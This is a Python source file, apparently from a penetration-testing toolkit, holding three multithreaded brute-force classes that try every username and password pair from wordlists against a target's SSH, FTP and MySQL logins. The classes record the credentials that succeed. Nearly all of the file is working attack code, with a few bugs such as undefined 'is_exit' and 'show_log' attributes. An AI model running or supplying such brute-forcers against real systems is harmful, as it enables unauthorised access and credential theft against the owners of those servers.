import queue
import socket
import threading
import time
from ftplib import FTP

import MySQLdb
import os
import paramiko


# SSH爆破
from config import APP_STATIC_TXT


class SshBruter():
    """docstring for SshBruter"""

    def __init__(self, host, userfile, passfile):
        self.host = host
        self.userfile = userfile
        self.passfile = passfile
        self.threadnum = 10
        self.timeout = 10
        self.result = []
        self.qlist = queue.Queue()
        print(self.host, self.userfile, self.passfile, self.threadnum)

    def get_queue(self):
        with open(self.userfile, 'r') as f:
            ulines = f.readlines()
        with open(self.passfile, 'r') as f:
            plines = f.readlines()

        for name in ulines:
            for pwd in plines:
                name = name.strip()
                pwd = pwd.strip()
                self.qlist.put(name + ':' + pwd)

    def thread(self):
        while not self.qlist.empty():
            if not self.is_exit:
                name, pwd = self.qlist.get().split(':')
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(hostname=self.host, port=22, username=name, password=pwd, timeout=self.timeout)
                    time.sleep(0.05)
                    ssh.close()
                    s = "[OK] %s:%s" % (name, pwd)
                    print(s)
                    self.result.append({"username": name, "password": pwd})
                except socket.timeout:
                    self.show_log(self.host, "Timeout...")
                    self.qlist.put(name + ':' + pwd)
                    time.sleep(3)
                except Exception as e:
                    error = "[Error] %s:%s" % (name, pwd)
                    print(error)
                    pass
            else:
                break

    def show_result(self, lname, rlist):
        if rlist:
            print("-------------------------------------------------------------------------------------")
            for x in rlist:
                print(x)
            return {lname: rlist}
        else:
            print("not found...")

    def run(self):
        self.get_queue()
        starttime = time.time()

        threads = []
        for x in range(1, self.threadnum + 1):
            t = threading.Thread(target=self.thread)
            threads.append(t)
            t.setDaemon(True)  # 主线程完成后不管子线程有没有结束，直接退出
            t.start()

        try:
            while True:
                if self.qlist.empty():
                    break
                else:
                    time.sleep(1)
        except KeyboardInterrupt:
            self.is_exit = True
            print("Exit the program...")
        print("Waiting...")
        time.sleep(1)

        self.show_result(self.host, self.result)
        finishetime = time.time()
        print("Used time: %f" % (finishetime - starttime))


# FTP爆破
class FtpBruter():
    """docstring for FtpBruter"""

    def __init__(self, host, userfile, passfile):
        self.host = host
        self.userfile = userfile
        self.passfile = passfile
        self.threadnum = 10
        self.timeout = 10
        self.result = []
        self.qlist = queue.Queue()
        print(self.host, self.userfile, self.passfile, self.threadnum)

    def get_queue(self):
        with open(self.userfile, 'r') as f:
            ulines = f.readlines()
        with open(self.passfile, 'r') as f:
            plines = f.readlines()

        for name in ulines:
            for pwd in plines:
                name = name.strip()
                pwd = pwd.strip()
                self.qlist.put(name + ':' + pwd)

    def thread(self):
        while not self.qlist.empty():
            name, pwd = self.qlist.get().split(':')
            try:
                ftp = FTP()
                ftp.connect(self.host, 21, self.timeout)
                ftp.login(name, pwd)
                time.sleep(0.05)
                ftp.quit()
                s = "[OK] %s:%s" % (name, pwd)
                print(s)
                self.result.append({"username": name, "password": pwd})
            except socket.timeout:
                self.show_log(self.host, "Timeout...")
                self.qlist.put(name + ':' + pwd)
                time.sleep(1)
            except Exception as e:
                error = "[Error] %s:%s" % (name, pwd)
                print(error)
                pass

    def show_result(self, lname, rlist):
        if rlist:
            print("-------------------------------------------------------------------------------------")
            for x in rlist:
                print(x)
            return {lname: rlist}
        else:
            print("not found...")

    def run(self):
        self.get_queue()
        starttime = time.time()

        threads = []
        for x in range(1, self.threadnum + 1):
            t = threading.Thread(target=self.thread)
            threads.append(t)
            t.setDaemon(True)  # 主线程完成后不管子线程有没有结束，直接退出
            t.start()

        try:
            while True:
                if self.qlist.empty():
                    break
                else:
                    time.sleep(1)
        except KeyboardInterrupt:
            self.is_exit = True
            print("Exit the program...")
        print("Waiting...")
        time.sleep(1)

        self.show_result(self.host, self.result)
        finishetime = time.time()
        print("Used time: %f" % (finishetime - starttime))


# mysql模块
class MysqlBruter():
    """docstring for MysqlBruter"""

    def __init__(self, host, userfile, passfile):
        self.host = host
        self.userfile = userfile
        self.passfile = passfile
        self.threadnum = 10
        self.timeout = 10
        self.result = []
        self.qlist = queue.Queue()
        print(self.host, self.userfile, self.passfile, self.threadnum)

    def get_queue(self):
        with open(os.path.join(APP_STATIC_TXT, self.userfile)) as f:
            ulines = f.readlines()
        with open(os.path.join(APP_STATIC_TXT, self.passfile)) as f:
            plines = f.readlines()

        for name in ulines:
            for pwd in plines:
                name = name.strip()
                pwd = pwd.strip()
                self.qlist.put(name + ':' + pwd)

    def thread(self):
        while not self.qlist.empty():
            name, pwd = self.qlist.get().split(':')
            try:
                conn = MySQLdb.connect(host=self.host, user=name, passwd=pwd, db='mysql', port=3306)
                if conn:
                    # time.sleep(0.05)
                    conn.close()
                s = "[OK] %s:%s" % (name, pwd)
                print(s)
                self.result.append({"username": name, "password": pwd})
            except socket.timeout:
                self.show_log(self.host, "Timeout")
                self.qlist.put(name + ':' + pwd)
                time.sleep(3)
            except Exception as e:
                error = "[Error] %s:%s" % (name, pwd)
                print(error)
                pass

    def show_result(self, lname, rlist):
        if rlist:
            print("-------------------------------------------------------------------------------------")
            for x in rlist:
                print(x)
            return {lname: rlist}
        else:
            print("not found...")

    def run(self):
        self.get_queue()
        starttime = time.time()

        threads = []
        for x in range(1, self.threadnum + 1):
            t = threading.Thread(target=self.thread)
            threads.append(t)
            t.setDaemon(True)  # 主线程完成后不管子线程有没有结束，直接退出
            t.start()

        try:
            while True:
                if self.qlist.empty():
                    break
                else:
                    time.sleep(1)
        except KeyboardInterrupt:
            self.is_exit = True
            print("Exit the program...")
        print("Waiting...")


        self.show_result(self.host, self.result)
        finishetime = time.time()
        print("Used time: %f" % (finishetime - starttime))
        return self.result